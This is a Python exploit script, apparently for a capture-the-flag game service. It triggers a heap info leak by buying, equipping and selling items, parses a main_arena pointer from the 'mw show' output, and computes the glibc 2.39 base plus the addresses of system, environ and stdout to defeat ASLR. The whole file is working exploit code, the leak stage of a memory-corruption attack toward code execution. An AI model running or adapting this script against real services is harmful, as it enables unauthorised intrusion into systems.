#!/usr/bin/env python3
# 动态 libc 泄露：每次连接实时算 libc_base（ASLR 自适应）
import socket, time, re, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
MAIN_ARENA_OFF=0x210a90   # libs/libc.so.6 (glibc 2.39) 固定偏移
BINS_OFF=0x90
SYSTEM_OFF=0x58750
ENVIRON_OFF=0x20bd58
STDOUT_OFF=0x2055c0

def connect_until_banner(tries=40):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(3)
    return None,None

def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)

s,b=connect_until_banner()
if s is None: print("NO BANNER"); sys.exit(1)
for i in range(8):
    cmd(s,"shop buy 0 1",["tx: item added","not enough"])
cmd(s,"inv equip 8",["tx: main world equipped","invalid"])
for i in range(7):
    cmd(s,"shop sell 1",["shop sold","invalid"])
cmd(s,"shop sell 1",["shop sold","invalid"])
o=cmd(s,"mw show",["Drops:"])
m=re.search(r"role=None #(\d+)", o)
leak=int(m.group(1))
libc_base=leak - BINS_OFF - MAIN_ARENA_OFF
print("[leak] 0x%x"%leak)
print("[libc_base] 0x%x"%libc_base)
print("[system] 0x%x"% (libc_base+SYSTEM_OFF))
print("[environ] 0x%x"% (libc_base+ENVIRON_OFF))
print("[_IO_2_1_stdout_] 0x%x"% (libc_base+STDOUT_OFF))
s.close()
